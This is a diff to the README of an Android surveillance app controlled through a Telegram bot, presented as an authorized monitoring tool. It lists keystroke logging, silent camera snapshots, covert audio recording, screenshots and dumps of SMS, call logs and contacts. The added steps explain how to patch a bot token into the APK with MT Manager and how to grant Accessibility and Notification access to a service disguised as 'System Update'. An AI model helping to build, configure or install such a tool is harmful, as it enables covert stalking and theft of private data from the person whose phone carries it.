@@ -14,7 +14,6 @@ A sophisticated Android monitoring and administration tool designed for authoriz
 *   **Media Surveillance**: Remote camera snapshots (front/back), audio recording, and automated gallery observation.
 *   **Data Extraction**: Remote dumping of Call Logs, Contacts, and SMS messages.
 *   **Process Isolation**: Core monitoring services run in an independent `:remote` process for maximum stability.
-*   **Remote Shell**: Execute terminal commands directly via the Telegram bot.
 
 ## 🛠️ Remote Commands
 
@@ -23,15 +22,48 @@ A sophisticated Android monitoring and administration tool designed for authoriz
 | `/ping` | Check if the system is online. |
 | `/status` | Get device hardware info, root status, and time. |
 | `/alllog` | Retrieve the complete local keystroke history and clear the file. |
-| `/screenshot` | Capture a real-time screenshot of the device. |
+| `/screenshot <value>` | Capture a real-time screenshot of the device. |
 | `/camera_front` | Take a silent snapshot using the front camera. |
 | `/camera_back` | Take a silent snapshot using the back camera. |
 | `/record <sec>` | Record ambient audio for a specified duration. |
-| `/location` | Get the current GPS coordinates of the device. |
-| `/dump_sms` | Export all SMS messages from the device. |
-| `/shell <cmd>` | Execute a remote shell command. |
+| `/dump_sms` `/dump_call` `dump_contacts`| Export all SMS , Call logs , Contacts from the device. |
 
-## ⚙️ Setup Instructions
+## ⚙️ Setup Instructions (MT MANAGER)
+
+# Open in MT Manager  :-
+
+◦ Locate the APK, tap it, and Select View.
+
+◦ Tap on **classes.dex** and select Dex Editor Plus. **(📌 select all Dex files)**
+
+◦ Search and Replace:
+
+◦ Tap Search and search for the text: YOUR_BOT_TOKEN_HERE. [obtained from @BotFather]
+
+◦ Replace it with your Bot Token inside the quotes.
+
+
+Now, search for : YOUR_CHAT_ID_HERE
+◦ Replace it with your real Chat ID inside the quotes. [obtained from @userinfobot]
+
+◦ Exit the editor and click OK and install the APK.
+
+◦ MT Manager will ask to Sign the APK. Ensure "Auto-sign" is checked and click OK.
+
+*   **Crucial**: Grant the following manual permissions for full functionality:
+        *   **Accessibility Service**: Enable "System Update" service.
+        *   **Notification Access**: Enable for "System Update".
+        *   **Battery Optimization**: Allow the app to run without restrictions.
+
+
+⚠️ Common Mistakes to Avoid:
+
+-> Do not remove the quotes (" "): If you delete the quotes, the Smali compiler will crash (this was the "mismatched input" error you had before).
+
+-> Case Sensitivity: Ensure the Bot Token is exactly as @BotFather gave it to you.
+
+
+## ⚙️ Setup Instructions (ANDROID STUDIO)
 
 1.  **Configure Credentials**:
     *   Open `app/src/main/java/com/pentest/torch/Config.kt`.
